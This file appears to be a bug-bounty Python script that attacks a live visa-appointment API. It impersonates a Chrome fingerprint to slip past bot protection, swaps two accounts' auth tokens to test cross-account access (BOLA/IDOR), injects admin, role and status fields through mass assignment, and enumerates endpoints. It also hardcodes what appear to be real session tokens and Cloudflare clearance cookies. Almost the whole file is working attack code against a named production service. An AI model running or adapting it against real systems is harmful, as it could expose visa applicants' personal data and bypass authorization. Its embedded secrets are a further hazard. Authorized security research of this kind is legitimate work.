#!/usr/bin/env python3
"""VFS LIFT API — BOLA/IDOR test suite via curl_cffi (Chrome JA3 impersonation).

Tests:
  1. Replay Account A and Account B requests (baseline — confirm 200)
  2. Cross-account BOLA: A's token + B's loginUser (and vice versa)
  3. Mass-assignment: inject role/isAdmin/status into request body
  4. Endpoint enumeration: probe related API paths with each token

Usage: env -u LD_PRELOAD -u http_proxy -u https_proxy -u all_proxy python3 scripts/vfs_bola_test.py
"""

import json, sys, time

try:
    from curl_cffi import requests as cr
except ImportError:
    sys.exit("curl_cffi not installed — pip install curl_cffi")

URL = "https://lift-api.vfsglobal.com/appointment/application"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# ── Account A (YesWeHack ninja — PwnFox red) ──
A_TOKEN = "EAAAALPCeCzUX9P1AMFXfUoDcSndJVjT7xJhAVrkrr+KwUfT0I05GcYUJgWG7U4b5C10mkXXknWrWC8YoCDAfEclKxe4ef2HTuaR7ETfKFlHhD3I2exL0OrPvkRJRDmA3Ib0FVG0MnkXo8feqNDPR3Xpd9CAZyDPEuY98YdDryt4VGQ/Q2PjeW0My3vfwrMesEzDyG6q6vTRyNR0WhhQFIdKXMBO9/8VRz3oVzTvTZNGZW0XkyAaEpRHkHNT0X3iwlb82poDW/P/BKYhAZ9cX2OqchtftB4JWlLflrplIlEnivcTqhpLsJyieMCkqn2lsjeqnrsnWJDGErlDlILKwS11dg2Ml7iaWuMAur3wadd2NDKunp9tCwydd761CqMpGDcJzH8t5OfonlqMyx99Vc2Ch3Rt6jtzlVZV9PbwgAMTpFRBFDbBrS1WqLFKgy7a3tEiDUBWzeqd4UUJjU1UYqyQtnkxxcBs0Q5IY6Es6hLVsiiHevtMMaUHCkCRuYHLAOthlevSirtoGXHj5cO7ud7EaYHUYsEDDenYVEmZJKM0evM+OUvK9rY10HVx3EFf9s8gg0qiaYYUhH+BG666B7q0Lzo9sfWtpfI2nI11Cj3m5YZwpIqdDEuhSHc1YXR+M6dR93Un0aRlbU+LtYfJaTyF3ouHHZzQPuHD1JU4ZgwWbYjR"
A_CLIENT = "tMBXpFZyqJJUqeqRgPyVSG63fSk8P2Tak1uO8KRBO094EkSyvIMb7Adi4378Gss0KEjZ0qUz8/IFp9OA2KNMwUv5lBH2CdH0DDbJNgM8ImkQQz8m3QtJHH6iLn3Bm9otKZL8TJWGU8Uq8Qe8BwlqRoUyRHZgLH0+ds45P5cODDlSiyMJnaIck/sVvxcUiJiSYS1BZrMm87cKYB+w6R2UniQsWPtN2d7/Z8AovykaPIJpSJO3CMuTJOHH6mnNCU0x7xN7WHW17kwM7yfwHNLNms2v/dFvrsnt7fUEJ1YZgXDVdz2nkXxO5Ze0nKaYzLojfEb7SkDDQgI/HjFE0CyV1A=="
A_EMAIL = "Mrdracula-ywh-768c7367a4af9026@yeswehack.ninja"
A_CF = "Lr1KApH.O3P8ED_VTV79Ys5fggEH.LE8OvOEA08NGRw-1782314099-1.2.1.1-JJmWNsNSsWIZQjiwflnrOu21hQgn9Vw73D.8BXlZs_a4TkH5k2xPpBglEZbeIzFlGxrrWz_vUicAuptJS1a2cKgTwOclYzZG9Csysn2Qtz1IoMpzhCUqS03F4apNddl4QFXKd5cEaxK_9i9JSQXMH5noMqmZltMa9WnbynQjFewe.YaDBkXzp7VWO9l37UZpzS0FTfMF2zFfduWqlJJiJ7.3o9OmIMrzKGuG5yElHd_qgO8S9h17vru570gEPpSNdjOSDBJtL1.ZgVHkQg5HaMpGkXV1a6fnOPnPPOchhCTfVolr5aFUm3S8.HZ3aBnOdBHEi.brR2zJATJm3PrSVA"
A_CFBM = "_VK2o3iQlL8q0FII5V4YlLq_PkUUDxcVrUxq1sijgGY-1782313892-1.0.1.1-POYXpfRUNCIGwsssYJsH.IjI2g5MPyQ3ZJyjlZrbEj4Z4U7WXJxvUOvlTngLu9jca3yBphN5CeYAYlrVhT4YIAFiZJtSF2hsrFuWXnMzW30"

# ── Account B (Bugcrowd ninja — PwnFox blue) ──
B_TOKEN = "EAAAAOlZb3Pz+d9ffJ1qVOlS6W/sm4ETQgRzXZ6vQv0F9qY1GichLZf36e1IGnL0TKn41bwSoBIRKJIHxs3X8EVgG5+6I0/B3u9juvTL5OkQRC43qx5I37xirItgXoV9FAmJAlI6pBCKSrm5XrOLLK7kCz3qoo50bRkwJUc/V018daSdVGNYO6RIHswLEqqu/auer9xn22EdBI15yFtekga+fuHEKkxUILcdpQgI7h5lqkzY5UAKz6MrHtB0VCVwYmTjeNa/GA3nSnkpHHFc08ZzUEejDjcinYy1FblzZeMRwiPA7hjDIza49Ur3+EES1A3Ni8kocuCijN83CTe2MYUCm3hb8caeGMjqENoMYpFKIY3e3qc2k1+gJ+9qi5tgL0T5Rdio8cGwRt+e4PUkK8LbP8KFjFDqMvZ4SbQLIF/LmyS828bdW2XbUSiInwj+Pzarg0/ByInVDDlwSuUG3oW+yzyKYslEhHwKZk78nYW05G/RYi0QgRSEcqrAG9HbErHXVn03+LhcHk+gx0TwoNXYsoD4s6JgFXMyV4IpKXqw6AQCX2vaLWybISk8TfHLf3K9awlUq4RWHpqLjIZ2aQJSWt4="
B_CLIENT = "OUOnTtDATg21G0m8rP3bAvKAewwMXP5j7/Q0cujGgmYX33IFFohOYbH4rxvziLeoRQW/qQiSc77Waxpx3/LDDpvQ1aRKMCj80NPjSeENF+yRn+/AnHYcCLDnJMTG1jcBhbeL8GPTmY6NdgYdx5c/YjsZ+1nLMEHpGS9EY5mQD7eJNMz+jaUC88I8I847/j/bj2nltGDqHOO5Fxz8h95P6z6lMj6Mp3yDa/Cbq0EgTkjboDKRFWQo//sW2MhXAIVV/W4rOKBtQWNlo1+958zq0MHviLUWwJN5X6FhJsAID+oCNrPw3zlUguOC+UEmYQ0e1pCWba5zx9ZDRFSL04bYOA=="
B_EMAIL = "TheN0thing_0@bugcrowdninja.com"
B_CF = "8UA8MbpWSJd.IqLrh6viYkOGj.dTRxbTBxhmQLbfhwg-1782314308-1.2.1.1-tYCINVimesuRu9fbPMzyYGGE3boGgOMAtKdGh1rQBcxUzsaE3yQVQLp2lj6AuEyo6cSBjp3rN.mMOGN3dJ3pGGvRtM0G2t1P_RrCMTxtQim8Z0aJwrAI4SPqicpE7d5pyrfKvCcBSYzUevIJZxH7ZKgYHdePie2NLRKxNpEvXHwuBjxWj2YTbXHjrtoy5bqsNXCPuPjvg4WLD96tVEFRjR58tJ5CJFlR9DVbTKR.XKpaQ9giMyLhiI9vi6KMxGdOtlbR_tHETtuO7p.YMaEifZ9WLG6jDN6L6fvRZy6jikvJeDKcIBH0BzMdJGfYJETRNxAB32iQiwXwZ6AP_fWkXNCJC8fVbYGEJ.l8gXeysQbfJi49d44grq9awmy2R_ZphKzGeTVyhCryux7mu_PY99NcUqNz.LD1eTXecV6iEtjaqzQw3I9IklSYZE.vVIPR"
B_CFBM = "Jn2yXnU95oyGLS3H2aTFHXmnGbbc3zO9UlkbOIZChmI-1782314266-1.0.1.1-8pnPi0x6dVz5.uw1yILGjCHsGXmBBjSuahBBhFwO5wE7oy9xfkLw4SyvMetpQlrkZsd9kfjAkDcLiohzH1d97qDovRsN6tcqi35bBOrtd_w"


def build_headers(token, client_source):
    return {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://visa.vfsglobal.com/",
        "authorize": token,
        "Content-Type": "application/json;charset=utf-8",
        "route": "egy/en/aut",
        "clientSource": client_source,
        "Origin": "https://visa.vfsglobal.com",
        "Alt-Used": "lift-api.vfsglobal.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

def build_cookies(cf_clearance, cf_bm):
    return {"cf_clearance": cf_clearance, "__cf_bm": cf_bm}

def build_body(email):
    return json.dumps({
        "countryCode": "egy",
        "missionCode": "aut",
        "loginUser": email,
        "languageCode": "en-US",
        "visaToken": None,
    })


def do_request(label, token, client_source, email, cf_clearance, cf_bm, url=URL, extra_body=None):
    h = build_headers(token, client_source)
    ck = build_cookies(cf_clearance, cf_bm)
    body_dict = {
        "countryCode": "egy",
        "missionCode": "aut",
        "loginUser": email,
        "languageCode": "en-US",
        "visaToken": None,
    }
    if extra_body:
        body_dict.update(extra_body)
    body = json.dumps(body_dict)

    print(f"\n{'='*80}")
    print(f"[{label}]")
    print(f"  POST {url}")
    print(f"  authorize: ...{token[-20:]}")
    print(f"  loginUser: {email}")
    if extra_body:
        print(f"  extra_body: {extra_body}")
    print(f"{'='*80}")

    try:
        r = cr.post(url, headers=h, cookies=ck, data=body, impersonate="chrome124", timeout=20)
        print(f"  STATUS: {r.status_code}")
        print(f"  HEADERS: {dict(r.headers)}")
        body_text = r.text[:3000]
        print(f"  BODY ({len(r.text)} chars): {body_text}")
        try:
            return r.status_code, r.json()
        except:
            return r.status_code, r.text[:3000]
    except Exception as e:
        print(f"  ERROR: {e}")
        return 0, str(e)


def main():
    results = {}

    # ── Test 1: Baseline replays ──
    print("\n" + "#"*80)
    print("# TEST 1: BASELINE — replay each account's own request")
    print("#"*80)

    code_a, body_a = do_request(
        "Account A (YWH) — own token + own loginUser",
        A_TOKEN, A_CLIENT, A_EMAIL, A_CF, A_CFBM
    )
    results["baseline_A"] = {"status": code_a, "body": body_a}
    time.sleep(1.5)

    code_b, body_b = do_request(
        "Account B (BCN) — own token + own loginUser",
        B_TOKEN, B_CLIENT, B_EMAIL, B_CF, B_CFBM
    )
    results["baseline_B"] = {"status": code_b, "body": body_b}
    time.sleep(1.5)

    # ── Test 2: Cross-account BOLA — token swap ──
    print("\n" + "#"*80)
    print("# TEST 2: BOLA — swap authorize tokens between accounts")
    print("#"*80)

    # A's token + B's loginUser (does server trust token or body?)
    code_ab, body_ab = do_request(
        "BOLA: A's token + B's loginUser",
        A_TOKEN, A_CLIENT, B_EMAIL, A_CF, A_CFBM
    )
    results["bola_A_token_B_user"] = {"status": code_ab, "body": body_ab}
    time.sleep(1.5)

    # B's token + A's loginUser
    code_ba, body_ba = do_request(
        "BOLA: B's token + A's loginUser",
        B_TOKEN, B_CLIENT, A_EMAIL, B_CF, B_CFBM
    )
    results["bola_B_token_A_user"] = {"status": code_ba, "body": body_ba}
    time.sleep(1.5)

    # ── Test 3: Mass-assignment — inject privileged fields ──
    print("\n" + "#"*80)
    print("# TEST 3: MASS-ASSIGNMENT — inject role/isAdmin/status fields")
    print("#"*80)

    for field_set in [
        {"role": "admin"},
        {"isAdmin": True},
        {"status": "approved"},
        {"role": "agent", "isAdmin": True, "status": "approved"},
    ]:
        label = f"Mass-assign: A + {field_set}"
        code_m, body_m = do_request(label, A_TOKEN, A_CLIENT, A_EMAIL, A_CF, A_CFBM, extra_body=field_set)
        results[f"mass_{list(field_set.keys())}"] = {"status": code_m, "body": body_m}
        time.sleep(1)

    # ── Test 4: Endpoint enumeration ──
    print("\n" + "#"*80)
    print("# TEST 4: ENDPOINT ENUMERATION — probe related API paths")
    print("#"*80)

    endpoints = [
        "/appointment/applicant",
        "/appointment/document",
        "/appointment/order",
        "/appointment/schedule",
        "/appointment/slot",
        "/appointment/visaCategory",
        "/appointment/refund",
        "/appointment/payment",
        "/user/profile",
        "/user/login",
        "/auth/jwtToken",
    ]
    base = "https://lift-api.vfsglobal.com"
    for ep in endpoints:
        full_url = base + ep
        code_e, body_e = do_request(
            f"Enum: POST {ep}",
            A_TOKEN, A_CLIENT, A_EMAIL, A_CF, A_CFBM, url=full_url
        )
        results[f"enum_{ep}"] = {"status": code_e, "body": body_e}
        time.sleep(0.8)

    # ── Summary ──
    print("\n" + "#"*80)
    print("# SUMMARY")
    print("#"*80)
    for k, v in results.items():
        status = v.get("status", "?")
        body = v.get("body", "")
        snippet = str(body)[:120] if body else "(empty)"
        print(f"  {k}: HTTP {status} — {snippet}")

    # Save full results
    out_path = "artifacts/vfs_bola_results.json"
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nFull results saved to {out_path}")


if __name__ == "__main__":
    main()
